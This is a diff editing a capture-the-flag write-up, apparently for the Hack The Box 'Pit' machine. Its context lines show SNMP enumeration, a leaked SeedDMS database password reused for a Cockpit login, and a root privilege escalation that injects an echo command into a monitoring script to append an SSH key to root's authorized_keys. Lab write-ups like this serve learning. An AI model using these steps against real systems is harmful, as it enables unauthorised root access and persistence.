@@ -63,7 +63,8 @@ Enumerating the SNMP service:
 snmpwalk -v2c -c public 10.10.10.241 . | tee snmp.out
 ```
 
-There is a potential username _michelle_.
+There is a potential username:
+- _michelle_
 
 Searching for web files:
 ```
@@ -73,7 +74,7 @@ grep html snmp.out
 There is the directory _/var/www/html/seeddms51x/seeddms_ which exists on the hostname _dms-pit.htb_ on port 80.
 It forwards to a login page of the document management system [SeedDMS](https://www.seeddms.org/):
 
-![Login form SeedDMS](pit_web-1.png)
+![Login form SeedDMS](pit_web-2.png)
 
 ## Exploiting SeedDMS
 
@@ -158,8 +159,7 @@ dbUser="seeddms"
 dbPass="ied^ieY6xoquu"
 ```
 
-The password works with the username _michelle_ on the login page of **Cockpit** on port 9090.
-In the menu is a _Terminal_ that has the permissions of the user _michelle_ on the box.
+The password works with the username _michelle_ on the login page of **Cockpit** on port 9090 and in the menu is a _Terminal_ that uses the permissions of the user.
 
 ## Privilege Escalation
 
@@ -210,7 +210,7 @@ It executed the `echo` command, so this can be used to upload an SSH key:
 echo 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABg(...) >> /root/.ssh/authorized_keys' > /usr/local/monitoring/check1.sh
 ```
 
-After running the `snmpwalk` again, the command will be executed and add the SSH key into _.ssh/authorized_keys_ file of root and it is possible to login as root!
+After running the `snmpwalk` again, the command will be executed and add the SSH key into the _.ssh/authorized_keys_ file of root and it is possible to login as root!
 ```
 ssh -i pit root@10.10.10.241
 ```
